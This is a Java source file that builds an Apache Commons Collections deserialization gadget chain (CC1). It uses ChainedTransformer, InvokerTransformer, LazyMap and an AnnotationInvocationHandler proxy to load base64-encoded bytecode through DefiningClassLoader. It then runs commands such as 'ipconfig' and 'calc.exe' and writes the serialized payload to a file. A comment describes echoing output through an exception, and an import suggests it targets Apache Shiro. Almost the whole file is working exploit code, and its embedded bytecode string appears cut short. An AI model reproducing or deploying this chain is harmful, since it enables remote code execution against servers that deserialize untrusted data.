package Echo;

import Commons.*;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;
import org.apache.tomcat.util.codec.binary.Base64;
import org.mozilla.javascript.DefiningClassLoader;
import sun.misc.BASE64Decoder;

import java.io.*;
import java.lang.annotation.Target;
import java.lang.reflect.*;
import java.util.HashMap;
import java.util.Map;
import Shiro_Attack.*;
/*
* 利用defineClass将字节码编译成类，突破urlclassload ，抛出异常回显
*
*
* */
public class defineclass {
    public static void main(String[] args) throws IOException, ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException {

//        byte[] bytes= toByteArray.toByteArray("src/Echo/test1.class");
//
//        System.out.println(Base64.encodeBase64String(bytes));

        String test1="yv66vgAAADQAUAoAFgAlCAAmBwAnCgAoACkKACgAKgoAKwAsCgADAC0KAAMALgcALwoACQAlCgAJADAHADEKAAwAMgoACQAzCAA0CgAMADUKAAwANgoAAwA3BwA4CgATADkHADoHADsBAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQAEZXhlYwEAFShMamF2YS9sYW5nL1N0cmluZzspVgEADVN0YWNrTWFwVGFibGUHADoHADEHADwHACcBAApFeGNlcHRpb25zAQAKU291cmNlRmlsZQEACnRlc3QxLmphdmEMABcAGAEAAAEAG2phdmEvaW8vQnVmZmVyZWRJbnB1dFN0cmVhbQcAPQwAPgA";


        BASE64Decoder base64Decoder=new BASE64Decoder();
        byte[] bytes=base64Decoder.decodeBuffer(test1);

//        Base64.decodeBase64(test);
        DefiningClassLoader definingClassLoader=new DefiningClassLoader();
        Class cl= definingClassLoader.defineClass("test1",bytes);
        Method method= cl.getDeclaredMethod("exec",String.class);
        method.invoke(cl.newInstance(),"ipconfig");

        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(DefiningClassLoader.class),
                new InvokerTransformer("getConstructor", new Class[]{
                        Class[].class}, new Object[]{new Class[0]}),
                new InvokerTransformer(
                        "newInstance", new Class[]{Object[].class}, new Object[]{new Object[0]}),
                new InvokerTransformer("defineClass", new Class[]{String.class,byte[].class}, new Object[]{"test",bytes}),
                new InvokerTransformer(
                        "newInstance",
                        new Class[]{},
                        new Object[]{}),
                new InvokerTransformer("exec",
                        new Class[]{String.class},
                        new Object[]{"calc.exe"})
        };
        Transformer transformerChain = new ChainedTransformer(transformers);

        Map map = new HashMap();
        Map lazyMap = LazyMap.decorate(map, transformerChain);

        Class clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");

        Constructor construct = clazz.getDeclaredConstructor(Class.class, Map.class);
        construct.setAccessible(true);

        InvocationHandler annotationInvocationHandler = (InvocationHandler) construct.newInstance(Target.class, lazyMap);
        Map proxyMap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), lazyMap.getClass().getInterfaces(), annotationInvocationHandler);
        annotationInvocationHandler = (InvocationHandler) construct.newInstance(Target.class, proxyMap);

        Serializer1.serializer("resourse/cc1.ser",annotationInvocationHandler);


    }
}
